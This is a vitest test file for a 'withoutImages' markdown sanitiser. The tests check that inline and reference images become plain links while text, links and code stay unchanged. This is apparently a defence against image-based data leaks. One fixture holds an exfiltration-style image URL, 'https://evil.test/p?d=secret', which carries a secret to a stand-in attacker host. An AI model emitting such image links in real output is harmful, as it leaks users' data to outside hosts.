import { describe, expect, it } from 'vitest';
import { withoutImages } from './safe-markdown';

describe('withoutImages', () => {
  it('turns inline and reference images into links', () => {
    expect(withoutImages('See ![shot](https://evil.test/p?d=secret) now')).toBe(
      'See [shot](https://evil.test/p?d=secret) now'
    );
    expect(withoutImages('![](http://x.test/a.png)')).toBe('[](http://x.test/a.png)');
    expect(withoutImages('![logo][ref]\n\n[ref]: https://x.test/l.png')).toBe(
      '[logo][ref]\n\n[ref]: https://x.test/l.png'
    );
    expect(withoutImages('a ![one](u1) b ![two](u2)')).toBe('a [one](u1) b [two](u2)');
  });

  it('leaves links, plain text and code as written', () => {
    const plain = 'Open [the app](http://localhost:5173)! [Next] steps: wait!';
    expect(withoutImages(plain)).toBe(plain);
    const code = 'Run `echo "![x](y)"` or:\n```md\n![alt](pic.png)\n```\ndone';
    expect(withoutImages(code)).toBe(code);
    expect(withoutImages('```\n![open fence](u)')).toBe('```\n![open fence](u)');
    expect(withoutImages('')).toBe('');
  });
});
